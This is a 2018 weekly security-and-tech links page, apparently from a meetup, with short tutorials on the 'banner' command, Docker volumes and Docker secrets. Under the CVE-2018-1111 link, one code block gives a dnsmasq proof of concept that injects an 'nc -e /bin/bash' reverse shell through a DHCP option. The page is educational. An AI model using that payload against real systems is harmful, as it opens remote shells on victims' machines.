.. include:: /pentest_links.txt


**********************************************
2018-05-19 Links, Containers, and Cryptography
**********************************************


Links and updates this week
===========================


Links around the web
--------------------


Cloud
^^^^^

#. `Verizon hops aboard the Amazon Web Services cloud train <https://siliconangle.com/blog/2018/05/15/verizon-hops-aboard-amazon-train-going-cloud/>`_ - "it’s planning to migrate more than 1,000 business-critical applications and database backend systems to AWS. The company is also planning to migrate a number of production databases to `Amazon’s Aurora service <https://siliconangle.com/blog/2017/10/24/amazon-web-services-adds-postgresql-compatibility-aurora-database/>`_, which is a relational database engine that was built to rival legacy systems such as Oracle Corp.’s 12c database."

#. `Be aware: How domain registrar can kill your business <https://www.uptimechecker.io/blog/how-domain-registrar-can-kill-your-business>`_


Tech
^^^^

#. `As the Web moves toward HTTPS by default, Chrome will remove “secure” indicator <https://arstechnica.com/gadgets/2018/05/as-the-web-moves-toward-https-by-default-chrome-will-remove-secure-indicator/>`_ - The browser is changing to flag the things that are dangerous, not the ones that are safe.

#. `Facebook Publishes Enforcement Numbers for the First Time <https://newsroom.fb.com/news/2018/05/enforcement-numbers/>`_ - Q1 2018 took down 837 million pieces of spam, disabled 583 million fake accounts, ...

#. `Why Kubernetes is Abbreviated k8s <https://medium.com/@rothgar/why-kubernetes-is-abbreviated-k8s-905289405a3c>`_ with `Numeronym <https://en.wikipedia.org/wiki/Numeronym>`_

#. `The Economics of Writing a Technical Book <https://medium.com/@rothgar/the-economics-of-writing-a-technical-book-689d0c12fe39>`_

   My April 2018 statement (sales from December — March) says I’ve made $11,554.15 which roughly breaks down to $23 per hour for the estimated 500 hours of work. Without the three sponsorships that would have been $5.29 per hour. Luckily that number only gets better with time.

   Would I write another book? Not for the foreseeable future. I would like to update *Cloud Native Infrastructure* to keep it fresh with current industry trends, but another book from scratch is not a year long project I’d be looking forward to at this time.

   I’m very proud of the work we accomplished and glad we wrote it. I can’t think of anything else I would have done with that time that would have been better spent.

#. `Inbox zero and the search for the perfect email client <https://arstechnica.com/information-technology/2018/05/inbox-zero-and-the-search-for-the-perfect-email-client/>`_

#. `Shady Marketplaces Selling Fake Facebook Profiles Operate In Plain Sight <https://www.buzzfeed.com/charliewarzel/heres-how-easy-it-is-to-buy-fake-facebook-profiles>`_

#. `How do we Stop Spilling the Beans Across Origins? <https://www.arturjanc.com/cross-origin-infoleaks.pdf>`_



Tools
^^^^^

#. `2FA Notifier <https://2fanotifier.org/>`_ - lets you know which sites you visit support 2FA and specifically how to enable it

#. `DARKSURGEON <https://github.com/cryps1s/DARKSURGEON>`_ - a Windows packer project to empower incident response, digital forensics, malware analysis, and network defense





Study links
^^^^^^^^^^^

#. `MEWKit: Cryptotheft’s Newest Weapon <https://cdn.riskiq.com/wp-content/uploads/2018/05/MEWKit-Cryptotheft-Newest-Weapon-RiskIQ-Research.pdf>`_

#. `DLL Hijacking via URL files <https://insert-script.blogspot.co.uk/2018/05/dll-hijacking-via-url-files.html>`_

#. `ANALYSIS OF A WIN32K NULL POINTER DEREFERENCE BY MATCHING THE MAY PATCH <https://xiaodaozhi.com/exploit/156.html>`_

#. `Qualys Security Advisory - Procps-ng Audit Report <http://www.openwall.com/lists/oss-security/2018/05/17/1>`_ - Qualsys performed a complete audit of procps-ng, the "command line and full screen utilities for browsing procfs, a 'pseudo' file system dynamically generated by the [Linux] kernel to provide information about the status of entries in its process table". ... discovered and submitted patches for more than a hundred bugs and vulnerabilities in procps-ng ...

#. `GraphQL - Security Overview and Testing Tips <https://blog.doyensec.com/2018/05/17/graphql-security-overview.html>`_

#. `TLS/SSL Explained - Examples of a TLS Vulnerability and Attack, Final Part <https://www.acunetix.com/blog/articles/tls-vulnerabilities-attacks-final-part/>`_ - 6th of 6 part series

#. `Part 5: PHP Security Mini Guide - PHP Security Tips <https://www.acunetix.com/websitesecurity/php-security-5/>`_ - 5th of 5 part series

#. `Detection and Prevention - An Introduction to Web-Shells - Final Part <https://www.acunetix.com/blog/articles/detection-prevention-introduction-web-shells-part-5/>`_ - 5th of 5 part series

#. `pwn910nd - abusing OpenWRT's printer server to become root <https://neonsea.uk/blog/2018/04/15/pwn910nd.html>`_

#. `Lateral Movement - WinRM <https://pentestlab.blog/2018/05/15/lateral-movement-winrm/>`_

#. `CVE-2018-1111 Red Hat Linux DHCP Client command injection <https://twitter.com/Barknkilic/status/996470756283486209>`_

   .. code-block:: bash
      :emphasize-lines: 1,4

      dnsmasq --interface=eth0 --bind-interfaces  --except-interface=lo \
              --dhcp-range=10.1.1.1,10.1.1.10,1h --conf-file=/dev/null \
	      --dhcp-option=6,10.1.1.1 --dhcp-option=3,10.1.1.1 \
	      --dhcp-option="252,x'&nc -e /bin/bash 10.1.1.1 1337 #"

#. `EFAIL <https://efail.de/>`_, the paper `Efail: Breaking S/MIME and OpenPGP Email Encryption using Exfiltration Channels (draft 0.9.0) <https://efail.de/efail-attack-paper.pdf>`_, `Decade-old Efail flaws can leak plaintext of PGP- and S/MIME-encrypted emails <https://arstechnica.com/information-technology/2018/05/decade-old-efail-attack-can-decrypt-previously-obtained-encrypted-e-mails/>`_, and `How e-FAIL Attack Works <https://thehackernews.com/2018/05/efail-pgp-email-encryption.html>`_

   `The Motherboard Guide to Not Getting Hacked <https://motherboard.vice.com/en_us/article/d3devm/motherboard-guide-to-not-getting-hacked-online-safety-guide>`_ does not recommend PGP, but follow `EMAIL SELF-DEFENSE <https://emailselfdefense.fsf.org/en/>`_ if you decide to use it (after EFAIL is fixed). Ironically, the Motherboard article's PDF is verified with a PGP signature file.

   `We're calling it: PGP is dead <http://www.wired.co.uk/article/efail-pgp-vulnerability-outlook-thunderbird-smime>`_

#. `Hackers Reveal How Code Injection Attack Works in Signal Messaging App <https://thehackernews.com/2018/05/signal-messenger-code-injection.html>`_ and `“I too like to live dangerously”, Accidentally Finding RCE in Signal Desktop via HTML Injection in Quoted Replies <https://thehackerblog.com/i-too-like-to-live-dangerously-accidentally-finding-rce-in-signal-desktop-via-html-injection-in-quoted-replies/index.html>`_ (with `signal-desktop HTML tag injection variant 2 <https://ivan.barreraoro.com.ar/signal-desktop-html-tag-injection-variant-2/>`_)

#. `Cracking Java’s RNG for CSRF <https://blog.securityevaluators.com/cracking-javas-rng-for-csrf-ea9cacd231d2>`_

#. `WHO’S WHO IN THE ZOO. CYBERESPIONAGE OPERATION TARGETS ANDROID USERS IN THE MIDDLE EAST <https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/05/03114450/ZooPark_for_public_final_edit.pdf>`_


#. `Dell SupportAssist Driver - Local Privilege Escalation <https://hatriot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation/>`_



Privacy links
^^^^^^^^^^^^^

#. `Tracking Firm LocationSmart Leaked Location Data for Customers of All Major U.S. Mobile Carriers Without Consent in Real Time Via Its Web Site <https://krebsonsecurity.com/2018/05/tracking-firm-locationsmart-leaked-location-data-for-customers-of-all-major-u-s-mobile-carriers-in-real-time-via-its-web-site/>`_

   Anyone with a modicum of knowledge about how Web sites work could abuse the LocationSmart demo site to figure out how to conduct mobile number location lookups at will, *all without ever having to supply a password or other credentials*.

   In more detail at `LocationSmart API Vulnerability <https://www.robertxiao.ca/hacking/locationsmart/>`_.

   `FCC investigates site that let most US mobile phones’ location be exposed <https://arstechnica.com/tech-policy/2018/05/fcc-investigates-site-that-let-most-us-mobile-phones-location-be-exposed/>`_.

#. Continuation of Securus links:

   `EFF file - Securus Technologies Location Based Services (LBS) <https://www.eff.org/files/2018/05/03/securus_white_paper_-_location_based_services_lbs_copy.pdf>`_

   `US cell carriers are selling access to your real-time phone location data <https://www.zdnet.com/article/us-cell-carriers-selling-access-to-real-time-location-data/>`_

   `Service Meant to Monitor Inmates’ Calls Could Track You, Too <https://www.nytimes.com/2018/05/10/technology/cellphone-tracking-law-enforcement.html>`_

   `Hacker Breaches Securus, the Company That Helps Cops Track Phones Across the US <https://motherboard.vice.com/en_us/article/gykgv9/securus-phone-tracking-company-hacked>`_ - most recent security breach

   `NOT SO SECURUS - Massive Hack of 70 Million Prisoner Phone Calls Indicates Violations of Attorney-Client Privilege <https://theintercept.com/2015/11/11/securus-hack-prison-phone-company-exposes-thousands-of-calls-lawyers-and-clients/>`_ - 2015 security breach

#. `Senators want FTC to investigate Google's location data collection <https://www.engadget.com/2018/05/14/senators-ftc-investigate-google-location-data-collection/>`_ with `Request to FTC from Blumenthal and Markey <https://www.blumenthal.senate.gov/imo/media/doc/05.11.2018%20-%20FTC%20-%20Google%20Location%20History.pdf>`_

#. `ACCC investigating Oracle research showing Google users Android phone plan data to spy <https://www.dailytelegraph.com.au/technology/smartphones/accc-investigating-oracle-research-showing-google-users-android-phone-plan-data-to-spy/news-story/3ca0cdaa3cc6992d134355bd0b7fcf40>`_

#. `REMEMBER WHEN GOOGLE SAID IT WOULD STOP READING YOUR EMAIL? <https://theoutline.com/post/4524/remember-when-google-said-it-would-stop-reading-your-email>`_

   Though Google `announced <https://blog.google/products/gmail/g-suite-gains-traction-in-the-enterprise-g-suites-gmail-and-consumer-gmail-to-more-closely-align/>`_ that it would stop using consumer Gmail content for ad personalization last July, the language permitting it to do so is still included in its current privacy policy, and it without a doubt still scans users emails for other purposes.


Cultural/Legal/Political
^^^^^^^^^^^^^^^^^^^^^^^^

#. `Exclusive: NSA encryption plan for ‘internet of things’ rejected by international body <https://www.wikitribune.com/story/2018/04/20/business/exclusive-nsa-encryption-plan-for-internet-of-things-rejected-by-international-body/67004/>`_

   Two delegates told WikiTribune that the opposition to adding these algorithms was led by Dr. Tomer Ashur from KU Leuven University, representing the Belgian delegation and it was supported by a large group of countries.

   Israeli delegate Orr Dunkelman told Reuters he did not trust the U.S. designers following the September meetings.

   “There are quite a lot of people in NSA who think their job is to subvert standards,” said Dunkelman. “My job is to secure standards.”

   The NSA said Simon and Speck were developed to protect U.S. government equipment without requiring a lot of processing power, and firmly believes they are secure.

   ... experts in the delegations have clashed over recent weeks and the NSA has not provided the technical detail on the algorithms that is usual for these processes. The U.S. delegation’s refusal to provide a “convincing design rationale is a main concern for many countries,” the source said.

#. `Department of Homeland Security Unveils Strategy to Guide Cybersecurity Efforts <https://www.dhs.gov/news/2018/05/15/department-homeland-security-unveils-strategy-guide-cybersecurity-efforts>`_ released 2 documents `DHS Cybersecurity Strategy <https://www.dhs.gov/publication/dhs-cybersecurity-strategy>`_

#. `Salesforce CEO Marc Benioff Calls for National Privacy Law <https://www.salesforce.com/company/news-press/stories/2018/5/051618/>`_

   “We really need in this country a national privacy law,” he said. “You can see it's going into effect in Europe with GDPR. That means in Europe your data belongs to you, but in the United States, your data belongs to all these companies that are collecting it, and they can do with it basically whatever they want. That's a shift we have to make. You can see that's about to happen in California where I am from."

#. `The rise of free urban internet <https://www.axios.com/the-rise-of-free-urban-internet-intersection-38171eed-1bfe-4627-9871-2623cbb2e4a6.html>`_

#. `Facebook Faulted by Judge for 'Troubling Theme' in Privacy Case <https://www.bloomberg.com/news/articles/2018-05-14/facebook-faulted-by-judge-for-troubling-theme-in-privacy-case>`_


Hacking links
^^^^^^^^^^^^^

#. `Hardcoded Password Found in Cisco Enterprise Software, Again <https://www.bleepingcomputer.com/news/security/hardcoded-password-found-in-cisco-enterprise-software-again/>`_

#. `Malware on Google Play Targets North Korean Defectors <https://securingtomorrow.mcafee.com/mcafee-labs/malware-on-google-play-targets-north-korean-defectors/>`_

#. `Thieves suck millions out of Mexican banks in transfer heist <https://www.reuters.com/article/us-mexico-cyber/thieves-suck-millions-out-of-mexican-banks-in-transfer-heist-idUSKCN1IF1X7>`_

#. `One year later: EternalBlue exploit more popular now than during WannaCryptor outbreak <https://www.welivesecurity.com/2018/05/10/one-year-later-eternalblue-exploit-wannacryptor/>`_

#. `Shadowy Hackers Accidentally Reveal Two Zero-Days to Security Researchers <https://www.bleepingcomputer.com/news/security/shadowy-hackers-accidentally-reveal-two-zero-days-to-security-researchers/>`_

   The exploit chain is a masterpiece of offensive hacking, but it would never as dangerous as it could have been because of an operational mistake its creators made by uploading it to a known virus scanning engine in the hopes of testing its detection level.

   Also `A tale of two zero-days <https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/>`_.

#. `Canonical finally comments on Ubuntu Linux Snap Store security failure <https://betanews.com/2018/05/15/canonical-snap-store-comment/>`_

#. `NOTICE OF UNAUTHORIZED ACCESS TO CHILI’S® GRILL & BAR GUEST DATA <http://brinker.mediaroom.com/ChilisDataIncident>`_

#. `Hacker Shuts Down Copenhagen’s Public City Bikes System <https://www.bleepingcomputer.com/news/security/hacker-shuts-down-copenhagen-s-public-city-bikes-system/>`_


Study this week
===============


Life in the terminal
--------------------


``banner``
^^^^^^^^^^

.. code-block:: console
  :emphasize-lines: 4,10

  BANNER(1)                                  User's Reference Manual                                 BANNER(1)

  NAME
	 banner - print large banner

  SYNOPSIS
	 banner text

  DESCRIPTION
	 banner prints out the first 10 characters of text in large letters.

So ``banner`` is restricted to 10 characters, but you can do more on a "line" in the shell:

.. code-block:: bash
  :emphasize-lines: 1,3

  # Not what we want
  banner "life in a terminal"
  # paste solves our problem
  banner "    SBWASP" > sbwasp.txt
  banner "life in a " > life_in_a_.txt
  banner " terminal" > terminal.txt
  paste life_in_a_.txt terminal.txt >> sbwasp.txt
  rm life*.txt term*.txt
  cat sbwasp.txt

Note that `TAAG <http://patorjk.com/software/taag/#p=display&f=Graffiti&t=Type%20Something%20>`_ allows upper/lower case and more than 10 characters.


Containers
----------


Education
^^^^^^^^^

Videos from `CNCF [Cloud Native Computing Foundation] <https://www.youtube.com/channel/UCvqbFHwN-nwalWPjPUKpvTA>`_:

#. `A Hacker's Guide to Kubernetes and the Cloud <https://www.youtube.com/watch?v=dxKpCO2dAy8>`_

#. `Kubernetes Storage Lingo 101 <https://www.youtube.com/watch?v=uSxlgK1bCuA>`_

#. `Persistent Storage with Kubernetes in Production - Which Solution and Why? <https://www.youtube.com/watch?v=hqE5c5pyfrk>`_

Also videos from `KubeCon <https://www.youtube.com/results?search_query=kubecon>`_:

#. `Kubecon 2017 - Kubernetes Deconstructed <https://github.com/carsonoid/kube-decon>`_


Using containers instead of multiple VMs
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

This is not something for corporations, but more for hobbyists who want to run multiple servers in 1 VM as containers. This avoids the cost of multiple VMs while still getting security isolation.

But remember that containers are stateless: terminated container data is lost forever, and terminated container host data is lost forever. So the idea is to:

* Use Dockerfile to automate container creation

* Use Docker host volumes backed by persistent storage to get persistent storage

  See `Dockerfile reference - VOLUME <https://docs.docker.com/engine/reference/builder/#volume>`_, `Docker Storage Volumes - Use volumes <https://docs.docker.com/storage/volumes/>`_, and `Kubernetes Concepts - Volumes <https://kubernetes.io/docs/concepts/storage/volumes/>`_.

  Note that block storage performance does not match local SSD storage (on any provider): for example `Linode Block Storage - Early Access - user comment <https://community.centminmod.com/threads/linode-block-storage-early-access.11985/#post-52259>`_ shows block storage beta was ~1/5 the speed of local SSD. Google's `Optimizing Persistent Disk and Local SSD Performance <https://cloud.google.com/compute/docs/disks/performance>`_ shows that standard persistent disks have 0.75 read IOPS per GB but local NVMe SSD is 453.3 (over 600X faster). SSD persistent disks rated 30 read IOPS per GB or 40X faster. Network block storage cannot match the speed of SSD local disks, but may be adequate for many applications, especially your toy servers.

Here are 2 examples illustrating this idea.

First see `Use a Block Storage Volume with Nextcloud <https://www.linode.com/docs/applications/cloud-storage/use-block-storage-volume-with-nextcloud/>`_ where a persistent block storage volume is mapped to a Docker host directory and that directory passed to the container via the Dockerfile. Note that while this example uses a mariadb container it is preferable to use a cloud database (if available). The advantage of this type of setup is that the Nextcloud part of the setup can easily be rebuilt by stopping the current container and rerunning the Dockerfile build.

Second, `jumanjiman/Dockerfile <https://gist.github.com/jumanjiman/da6935986c1d1d2a7451>`_ shows an example of running :program:`exim` in a container.

* exim's configuration files: :file:`aliases`, :file:`local.conf`

* :program:`systemd` file: :file:`mail.service` to start the exim docker container. Note that if you were using an orchestration solution like K8s, this file would not be needed and running the container would be managed by K8s.

* Script :program:`harden.sh` for security hardening.

* A file layout description in file :file:`file layout`

* And :file:`Dockerfile` showing the exim VOLUME mount points where persistant storage can be used.

  This Dockerfile allows easy rebuild of the exim container.


Container configuration issues
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Consider `Don’t Embed Configuration or Secrets in Docker Images <https://medium.com/@mccode/dont-embed-configuration-or-secrets-in-docker-images-7b2e0f916fdd>`_. Secrets management as described there is done at the orchestration level.

`Manage sensitive data with Docker secrets <https://docs.docker.com/engine/swarm/secrets/>`_ is managed via Docker Swarm command `docker secret <https://docs.docker.com/engine/reference/commandline/secret/>`_ (note lack of modify command):

.. code-block:: bash
  :emphasize-lines: 1,11-14

  hacker@kali:~$ docker secret --help

  Usage:  docker secret COMMAND

  Manage Docker secrets

  Options:


  Commands:
    create      Create a secret from a file or STDIN as content
    inspect     Display detailed information on one or more secrets
    ls          List secrets
    rm          Remove one or more secrets

  Run 'docker secret COMMAND --help' for more information on a command.

`Kubernetes Tasks - Distribute Credentials Securely Using Secrets <https://kubernetes.io/docs/tasks/inject-data-application/distribute-credentials-secure/>`_ "shows how to securely inject sensitive data, such as passwords and encryption keys, into Pods."

On the configuration side, see `Store configuration data using Docker Configs <https://docs.docker.com/engine/swarm/configs/>`_ is requires Docker Swarm and uses `docker config <https://docs.docker.com/engine/reference/commandline/config/>`_ (and config is immutable like a secret):

.. code-block:: bash
  :emphasize-lines: 1,11-14

  hacker@kali:~$ docker config --help

  Usage:  docker config COMMAND

  Manage Docker configs

  Options:


  Commands:
    create      Create a config from a file or STDIN
    inspect     Display detailed information on one or more configs
    ls          List configs
    rm          Remove one or more configs

  Run 'docker config COMMAND --help' for more information on a command.

For K8s follow `Kubernetes Tasks - Configure a Pod to Use a ConfigMap <https://kubernetes.io/docs/tasks/configure-pod-container/configure-pod-configmap/>`_.


Cryptography
------------

Please see :ref:`crypto` for a continuation of our cryptography discussion.
